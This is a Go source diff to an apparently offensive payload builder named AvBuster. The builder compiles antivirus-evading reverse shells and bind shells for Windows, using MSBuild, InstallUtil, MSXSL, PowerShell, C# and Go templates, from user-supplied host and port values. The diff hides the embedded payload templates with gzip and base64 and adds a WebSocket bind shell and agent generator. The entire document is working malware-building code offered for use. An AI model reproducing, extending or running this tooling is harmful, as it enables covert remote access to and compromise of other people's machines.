@@ -4,6 +4,7 @@ import (
 	"bufio"
 	"bytes"
 	"compress/flate"
+	"compress/gzip"
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
@@ -31,8 +32,10 @@ type DownloadLink struct {
 }
 type UserValues struct {
 	userchoice            string
+	rport                 string
 	lport                 string
 	lhost                 string
+	rhost                 string
 	shellcode             string
 	shellcodedeckey       string
 	saveas                string
@@ -185,14 +188,8 @@ func (currentuservals *UserValues) createavbusterpayload(ismanager bool, isCs bo
 		osandappdetails.targetos = currentuservals.targetos
 		osandappdetails.targetarchitecture = currentuservals.targetarchitecture
 		go osandappdetails.avbusterbuildgoexe(finflag, dwnloadlink.Link, setpath, ismanager)
+		<-finflag
 
-		/*if ismanager {
-			go avbusterbuildgoexe(finflag, dwnloadlink.Link, setpath, userselectedval, ismanager)
-			<-finflag
-		} else {
-			go avbusterbuildgoexe(finflag, dwnloadlink.Link, setpath, userselectedval, ismanager)
-			<-finflag
-		}*/
 	}
 }
 
@@ -550,11 +547,11 @@ func (currentuservals *UserValues) processpinnedcertrevshell(req *http.Request) 
 
 	outpath = `outfiles` + string(os.PathSeparator) + `pinnedcert.go`
 	manageroutpath = `outfiles` + string(os.PathSeparator) + `pinnedcertmanager.go`
-	currentuservals.binarytemplate = binarytemplates.AvBusterPinnedCertReverseShell
+	currentuservals.binarytemplate = decodeanddecompress(binarytemplates.AvBusterPinnedCertReverseShell)
 	fmt.Println("building pinned cert revshell")
 	currentuservals.createavbusterpayload(false, false)
 
-	currentuservals.binarytemplate = binarytemplates.AvBusterPinnedCertReverseShellManager
+	currentuservals.binarytemplate = decodeanddecompress(binarytemplates.AvBusterPinnedCertReverseShellManager)
 	currentuservals.createavbusterpayload(true, false)
 	os.Remove(outpath)
 	os.Remove(manageroutpath)
@@ -600,7 +597,7 @@ func (currentuservals *UserValues) processselfsignedrevshell(req *http.Request) 
 	currentuservals.binarytemplate = binarytemplates.AvBusterSelfSignedHttps
 	fmt.Println("building http revshell")
 	currentuservals.createavbusterpayload(false, false)
-	currentuservals.binarytemplate = binarytemplates.AvBusterSelfSignedHttpsManager
+	currentuservals.binarytemplate = decodeanddecompress(binarytemplates.AvBusterSelfSignedHttpsManager)
 	currentuservals.createavbusterpayload(true, false)
 	os.Remove(outpath)
 	os.Remove(manageroutpath)
@@ -632,13 +629,13 @@ func (currentuservals *UserValues) processmsbuildrevshell(req *http.Request) {
 	//fmt.Println(apptype)
 	if apptype == "Console" {
 		outpath = `outfiles` + string(os.PathSeparator) + `msbuild.cs`
-		currentuservals.binarytemplate = binarytemplates.AvBusterMSBuildTCPReverseShellCS
+		currentuservals.binarytemplate = decodeanddecompress(binarytemplates.AvBusterMSBuildTCPReverseShellCS)
 		fmt.Println("building msbuild console")
 		currentuservals.createavbusterpayload(false, true)
 
 	} else {
 		outpath = `outfiles` + string(os.PathSeparator) + `msbuildgui.cs`
-		currentuservals.binarytemplate = binarytemplates.AvBusterMsBuildTCPReverseShellGUI
+		currentuservals.binarytemplate = decodeanddecompress(binarytemplates.AvBusterMsBuildTCPReverseShellGUI)
 		fmt.Println("building GUI msbuild gui revshell")
 		currentuservals.createavbusterGUIpayload(false)
 
@@ -675,7 +672,7 @@ func (currentuservals *UserValues) processinstallutilrevshell(req *http.Request)
 
 	//fmt.Println(apptype)
 	outpath = `outfiles` + string(os.PathSeparator) + `installutil.go`
-	currentuservals.binarytemplate = binarytemplates.AvBusterInstallShieldTCPReverseShell
+	currentuservals.binarytemplate = decodeanddecompress(binarytemplates.AvBusterInstallShieldTCPReverseShell)
 	fmt.Println("building installutil revshell")
 	currentuservals.createavbusterpayload(false, false)
 
@@ -707,12 +704,12 @@ func (currentuservals *UserValues) processmsxsltrevshell(req *http.Request) {
 	//fmt.Println(apptype)
 	if apptype == "Console" {
 		outpath = `outfiles` + string(os.PathSeparator) + `msxslt.cs`
-		currentuservals.binarytemplate = binarytemplates.AvBusterInlinerConsoleRevShell
+		currentuservals.binarytemplate = decodeanddecompress(binarytemplates.AvBusterInlinerConsoleRevShell)
 		fmt.Println("building msxslt")
 		currentuservals.createavbusterpayload(false, true)
 	} else {
 		outpath = `outfiles` + string(os.PathSeparator) + `msxsltgui.cs`
-		currentuservals.binarytemplate = binarytemplates.AvBusterInlinerGUIRevShell
+		currentuservals.binarytemplate = decodeanddecompress(binarytemplates.AvBusterInlinerGUIRevShell)
 		fmt.Println("building GUI msxslt")
 		currentuservals.createavbusterGUIpayload(false)
 
@@ -744,7 +741,7 @@ func (currentuservals *UserValues) processencryptedcustomshellcode(req *http.Req
 
 	//fmt.Println(apptype)
 	outpath = `outfiles` + string(os.PathSeparator) + `encshell.go`
-	currentuservals.binarytemplate = binarytemplates.AvBusterEncryptedShellCode
+	currentuservals.binarytemplate = decodeanddecompress(binarytemplates.AvBusterEncryptedShellCode)
 	fmt.Println("building encshellcode revshell")
 	currentuservals.prepareEncryptedShellCode(false)
 
@@ -788,10 +785,39 @@ func avbusterhomepage(httpw http.ResponseWriter, req *http.Request) {
 			currentuservals.processpinnedcertrevshell(req)
 		} else if choice == "normaltcprev" {
 			currentuservals.processnormalrevtcp(req)
+		} else if choice == "websocketbindshell" {
+			currentuservals.processwebsocketbindshell(req)
 		}
 		err = avbustertemplate.Execute(httpw, nil)
 		checkerror(err)
 	}
+}
+func (currentuservals *UserValues) processwebsocketbindshell(req *http.Request) {
+	saveas := req.Form.Get("saveas")
+	if strings.TrimSpace(saveas) == "" {
+		saveas = "noname"
+	}
+
+	lport := req.Form.Get("lport")
+	rport := req.Form.Get("rport")
+	rhost := req.Form.Get("rhost")
+	//currentuservals := UserValues{}
+	currentuservals.lport = lport
+	currentuservals.rport = rport
+	currentuservals.rhost = rhost
+	currentuservals.targetos = "windows"
+	currentuservals.targetarchitecture = "386"
+	currentuservals.saveas = saveas
+
+	outpath = "outfiles" + string(os.PathSeparator) + "websocketbinshell.go"
+	outpath2 := "outfiles" + string(os.PathSeparator) + "websocketbinshellagent.go"
+
+	currentuservals.binarytemplate = decodeanddecompress(binarytemplates.AvBusterWebSocketGetIPandUpdateHTML)
+	currentuservals.createwebsocketbinshell(outpath)
+	currentuservals.binarytemplate = decodeanddecompress(binarytemplates.AvBusterWebSocketBindShellAgent)
+	currentuservals.createwebsocketbinshellagent(outpath2)
+	os.Remove(outpath)
+	os.Remove(outpath2)
 }
 
 func (currentuservals *UserValues) processpscsharp(req *http.Request) {
@@ -813,18 +839,78 @@ func (currentuservals *UserValues) processpscsharp(req *http.Request) {
 
 	if apptype == "Console" {
 		outpath = "outfiles" + string(os.PathSeparator) + "pscsharprevtcp.cs"
-		currentuservals.binarytemplate = binarytemplates.AvBusterPSCsharpRevShellConsole
+		currentuservals.binarytemplate = decodeanddecompress(binarytemplates.AvBusterPSCsharpRevShellConsole)
 		fmt.Println("building psrevshell")
 		currentuservals.createavbusterpayloadforpscsharp(false)
 
 	} else {
 		outpath = "outfiles" + string(os.PathSeparator) + "pscsharprevgui.cs"
-		currentuservals.binarytemplate = binarytemplates.AvBusterPSCsharpRevShellGUI
+		currentuservals.binarytemplate = decodeanddecompress(binarytemplates.AvBusterPSCsharpRevShellGUI)
 		fmt.Println("building GUI psrevshell")
 		currentuservals.createavbusterpayloadforpscsharp(true)
 	}
 
 	os.Remove(outpath)
+}
+
+func (currentuservals *UserValues) createwebsocketbinshell(outpath string) {
+	var setpath string
+
+	fmt.Println(currentuservals.saveas)
+
+	dwnloadlink.Link = `download` + string(os.PathSeparator) + currentuservals.saveas + ".exe"
+
+	correctedquotes := strings.Replace(currentuservals.binarytemplate, "RPL", "`", -1)
+	rportreplaced := strings.Replace(correctedquotes, "RPORT", currentuservals.rport, 1)
+	lportreplaced := strings.Replace(rportreplaced, "LPORT", currentuservals.lport, 1)
+	setpath = outpath
+	newFile, err := os.Create(setpath)
+	checkerror(err)
+	newFile.WriteString(lportreplaced)
+	newFile.Close()
+	finflag := make(chan string)
+
+	osandappdetails := UserSelectedOsDetails{}
+	//osandappdetails.apptype = currentuservals.apptype
+	osandappdetails.controlleros = currentuservals.controlleros
+	osandappdetails.controllerachitecture = currentuservals.controllerachitecture
+	osandappdetails.targetos = currentuservals.targetos
+	osandappdetails.targetarchitecture = currentuservals.targetarchitecture
+	osandappdetails.apptype = "Console"
+	go osandappdetails.avbusterbuildgoexe(finflag, dwnloadlink.Link, setpath, false)
+	<-finflag
+
+}
+
+func (currentuservals *UserValues) createwebsocketbinshellagent(outpath string) {
+	var setpath string
+
+	fmt.Println(currentuservals.saveas)
+
+	dwnloadlink.Link = `download` + string(os.PathSeparator) + currentuservals.saveas + "agent" + ".exe"
+
+	correctedquotes := strings.Replace(currentuservals.binarytemplate, "RPL", "`", -1)
+	rhostreplaced := strings.Replace(correctedquotes, "RHOST", currentuservals.rhost, 1)
+	rportreplaced := strings.Replace(rhostreplaced, "RPORT", currentuservals.rport, 1)
+	lportreplaced := strings.Replace(rportreplaced, "LPORT", currentuservals.lport, 1)
+
+	setpath = outpath
+	newFile, err := os.Create(setpath)
+	checkerror(err)
+	newFile.WriteString(lportreplaced)
+	newFile.Close()
+	finflag := make(chan string)
+
+	osandappdetails := UserSelectedOsDetails{}
+	//osandappdetails.apptype = currentuservals.apptype
+	osandappdetails.controlleros = currentuservals.controlleros
+	osandappdetails.controllerachitecture = currentuservals.controllerachitecture
+	osandappdetails.targetos = currentuservals.targetos
+	osandappdetails.targetarchitecture = currentuservals.targetarchitecture
+	osandappdetails.apptype = "Console"
+	go osandappdetails.avbusterbuildgoexe(finflag, dwnloadlink.Link, setpath, false)
+	<-finflag
+
 }
 
 func (currentuservals *UserValues) createavbusterpayloadforpscsharp(isGui bool) {
@@ -855,11 +941,28 @@ func (currentuservals *UserValues) createavbusterpayloadforpscsharp(isGui bool) 
 
 }
 
-func decodebinarytemplate(encodedbinarytemplate string) string {
-	decodedstring, err := base64.StdEncoding.DecodeString(encodedbinarytemplate)
-	checkerror(err)
-	return string(decodedstring)
+func decodeanddecompress(userval string) string {
+	dcodedval, _ := base64.StdEncoding.DecodeString(userval)
+	zipbuffer := bytes.NewReader(dcodedval)
+	decompressedbytes, _ := gzip.NewReader(zipbuffer)
+	originalval, _ := ioutil.ReadAll(decompressedbytes)
+	return string(originalval)
+}
 
+func compressandcode(userval string) string {
+	var zipbuffer bytes.Buffer
+	gzwriter := gzip.NewWriter(&zipbuffer)
+	if _, err := gzwriter.Write([]byte(userval)); err != nil {
+		log.Fatal(err)
+	}
+	if err := gzwriter.Flush(); err != nil {
+		log.Fatal(err)
+	}
+	if err := gzwriter.Close(); err != nil {
+		log.Fatal(err)
+	}
+	result := base64.StdEncoding.EncodeToString(zipbuffer.Bytes())
+	return result
 }
 
 func avbusterbuildpscsharpconsole(finflag chan string, exepath, csfilepath string, isGui bool) {
@@ -953,10 +1056,10 @@ func (currentuservals *UserValues) processhybridencrypt(req *http.Request) {
 
 	outpath = "outfiles" + string(os.PathSeparator) + `hybridrev.go`
 	manageroutpath = "outfiles" + string(os.PathSeparator) + "hybridrevshellmanager.go"
-	currentuservals.binarytemplate = binarytemplates.AvBusterTCPHybridReverseShell
+	currentuservals.binarytemplate = decodeanddecompress(binarytemplates.AvBusterTCPHybridReverseShell)
 	fmt.Println("building hybrid revshell")
 	currentuservals.createavbusterpayload(false, false)
-	currentuservals.binarytemplate = binarytemplates.AvBusterTCPHybridReverseShellManager
+	currentuservals.binarytemplate = decodeanddecompress(binarytemplates.AvBusterTCPHybridReverseShellManager)
 	currentuservals.createavbusterpayload(true, false)
 
 	os.Remove(outpath)
@@ -1000,10 +1103,10 @@ func (currentuservals *UserValues) processhttprevshell(req *http.Request) {
 
 	outpath = `outfiles` + string(os.PathSeparator) + `httprevshell.go`
 	manageroutpath = `outfiles` + string(os.PathSeparator) + `httprevshellmanager.go`
-	currentuservals.binarytemplate = binarytemplates.AvBusterHttpReverseShell
+	currentuservals.binarytemplate = decodeanddecompress(binarytemplates.AvBusterHttpReverseShell)
 	fmt.Println("building http revshell")
 	currentuservals.createavbusterpayload(false, false)
-	currentuservals.binarytemplate = binarytemplates.AvBusterHttpReverseShellManager
+	currentuservals.binarytemplate = decodeanddecompress(binarytemplates.AvBusterHttpReverseShellManager)
 	currentuservals.createavbusterpayload(true, false)
 
 	os.Remove(outpath)
@@ -1038,7 +1141,7 @@ func (currentuservals *UserValues) processnormalrevtcp(req *http.Request) {
 	currentuservals.saveas = saveas
 
 	outpath = `outfiles` + string(os.PathSeparator) + `normaltcp.cs`
-	currentuservals.binarytemplate = binarytemplates.AvBusterSimpleRevShell
+	currentuservals.binarytemplate = decodeanddecompress(binarytemplates.AvBusterSimpleRevShell)
 	fmt.Println("building customdotnet revshell")
 	currentuservals.createavbusterpayload(false, true)
 
@@ -1074,10 +1177,10 @@ func (currentuservals *UserValues) processcustomdotnet(req *http.Request) {
 
 	outpath = `outfiles` + string(os.PathSeparator) + `customdotnet.cs`
 	manageroutpath = "outfiles" + string(os.PathSeparator) + "customdotnet.cs"
-	currentuservals.binarytemplate = binarytemplates.AvBusterCustomCSharpRevShellClient
+	currentuservals.binarytemplate = decodeanddecompress(binarytemplates.AvBusterCustomCSharpRevShellClient)
 	fmt.Println("building customdotnet revshell")
 	currentuservals.createavbusterpayload(false, true)
-	currentuservals.binarytemplate = binarytemplates.AvBusterCustomCSharpRevShellManager
+	currentuservals.binarytemplate = decodeanddecompress(binarytemplates.AvBusterCustomCSharpRevShellManager)
 	currentuservals.createavbusterpayload(true, true)
 
 	os.Remove(outpath)
@@ -1119,10 +1222,10 @@ func (currentuservals *UserValues) processcustomgo(req *http.Request) {
 
 	outpath = `outfiles` + string(os.PathSeparator) + `customgorev.go`
 	manageroutpath = "outfiles" + string(os.PathSeparator) + "customgorevshellmanager.go"
-	currentuservals.binarytemplate = binarytemplates.AvBusterCustomGoReverseShell
+	currentuservals.binarytemplate = decodeanddecompress(binarytemplates.AvBusterCustomGoReverseShell)
 	fmt.Println("building customgo revshell")
 	currentuservals.createavbusterpayload(false, false)
-	currentuservals.binarytemplate = binarytemplates.AvBusterCustomGoReverseShellManager
+	currentuservals.binarytemplate = decodeanddecompress(binarytemplates.AvBusterCustomGoReverseShellManager)
 	currentuservals.createavbusterpayload(true, false)
 
 	os.Remove(outpath)
@@ -1148,13 +1251,13 @@ func (currentuservals *UserValues) processpsrevshellbuild(req *http.Request) {
 
 	if apptype == "Console" {
 		outpath = "outfiles" + string(os.PathSeparator) + "powrevtcp.cs"
-		currentuservals.binarytemplate = binarytemplates.AvBusterPowerShellTCPReverseShellCS
+		currentuservals.binarytemplate = decodeanddecompress(binarytemplates.AvBusterPowerShellTCPReverseShellCS)
 		fmt.Println("building psrevshell")
 		currentuservals.createavbusterpayload(false, true)
 
 	} else {
 		outpath = "outfiles" + string(os.PathSeparator) + "psrevgui.cs"
-		currentuservals.binarytemplate = binarytemplates.AvBusterPowerShellTCPReverseShellGUI
+		currentuservals.binarytemplate = decodeanddecompress(binarytemplates.AvBusterPowerShellTCPReverseShellGUI)
 		fmt.Println("building GUI psrevshell")
 		currentuservals.createavbusterGUIpayload(false)
 	}
